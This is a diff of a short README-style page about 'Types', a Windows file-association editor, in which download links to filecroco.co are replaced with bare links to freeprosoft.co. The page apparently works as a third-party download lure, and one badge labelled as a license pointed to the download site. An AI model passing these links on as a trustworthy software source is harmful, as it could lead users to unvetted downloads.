@@ -3,7 +3,7 @@
 - 
 ## The Different Types of Windows 2025 
 
-## [![Download](https://img.shields.io/badge/Download_link-Black.svg)](https://filecroco.co/ddl/)
+## https://freeprosoft.co/ddl/
 
 
 If you're anything like me, then you're probably installing and uninstalling apps on a daily basis, which usually messes up all file associations in the system.
@@ -15,5 +15,5 @@ Besides file associations, Types also lets you edit icons, context menu, propert
 On the downside, the program is not very easy to use and doesn't include any documentation either, so you better know what you're doing before editing anything.
 Types can help you restore broken file associations in your system, though it may not be easy to use for a beginner.
 
-## [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://filecroco.co/ddl/)
+## https://freeprosoft.co/ddl/
 
